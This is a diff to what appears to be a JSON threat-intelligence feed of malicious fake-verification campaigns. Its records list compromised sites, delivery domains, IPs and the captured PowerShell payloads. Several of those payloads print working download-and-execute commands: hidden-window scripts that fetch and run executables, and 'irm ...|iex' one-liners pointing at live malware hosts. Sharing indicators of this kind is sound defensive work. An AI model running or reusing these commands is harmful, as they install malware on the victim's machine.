@@ -1,5 +1,77 @@
 [
   {
+    "UrlDomain": "gokanke.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwra5awt2gdb0oml2wrx9ac8",
+    "ScannedAt": "2026-11-22T03:31:15.014000+00:00"
+  },
+  {
+    "UrlDomain": "mayflowerpllc.com",
+    "DeliveryUrl": [
+      "quembrixel.com"
+    ],
+    "PayloadUrl": [
+      "https://quembrixel.com/56a61926.exe"
+    ],
+    "IP": [
+      "192.232.223.143"
+    ],
+    "Related": [],
+    "Payload": "powershell -WindowStyle Hidden -Command \"$p=Join-Path $env:PUBLIC '56a61926.exe';(New-Object Net.WebClient).DownloadFile('https://quembrixel[.]com/56a61926.exe',$p);Start-Process $p\"",
+    "ResolvedDownloadUrl": [
+      "https://quembrixel.com/56a61926.exe"
+    ],
+    "ReportId": "cmwra3laa2gaw0omlvjjj9cxj",
+    "ScannedAt": "2026-11-22T03:29:55.133000+00:00"
+  },
+  {
+    "UrlDomain": "ihealthytree.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/5d99abf403611db7",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=3a4cbee7efe202a2084b40f3ee3adb6fe03f042266d1dc97&amp;_v=29921968",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=e3b0c5497ffaae9db82616369a62781a8fbd599720414d4b",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=3a4cbee7efe202a2084b40f3ee3adb6fe03f042266d1dc97&_v=29921968",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/5d99abf403611db7'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/5d99abf403611db7"
+    ],
+    "ReportId": "cmwra2jib2ga20oml2najpclq",
+    "ScannedAt": "2026-11-22T03:29:06.177000+00:00"
+  },
+  {
     "UrlDomain": "startupsteroid.com",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -7032,62 +7104,5 @@
     ],
     "ReportId": "cmwlltm271k7m0omlj7e36c2f",
     "ScannedAt": "2026-11-18T04:11:27.895000+00:00"
-  },
-  {
-    "UrlDomain": "holyfamilymobility.ca",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/42dd3b56611904f4"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/42dd3b56611904f4')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/42dd3b56611904f4"
-    ],
-    "ReportId": "cmwlk2b0m1k450omldyolyil5",
-    "ScannedAt": "2026-11-18T03:22:14.273000+00:00"
-  },
-  {
-    "UrlDomain": "lucienebata.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/0164f0f9b6033a37"
-    ],
-    "IP": [
-      "92.205.248.102"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0164f0f9b6033a37')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/0164f0f9b6033a37"
-    ],
-    "ReportId": "cmwljnrpx1k140omlyyd1hsig",
-    "ScannedAt": "2026-11-18T03:10:56.101000+00:00"
-  },
-  {
-    "UrlDomain": "lovelybake.googlecloudservices.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/116419499d11ffd2"
-    ],
-    "IP": [
-      "72.61.174.128"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/116419499d11ffd2')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/116419499d11ffd2"
-    ],
-    "ReportId": "cmwljbytb1jwa0omlrmiaavfj",
-    "ScannedAt": "2026-11-18T03:01:45.293000+00:00"
   }
 ]
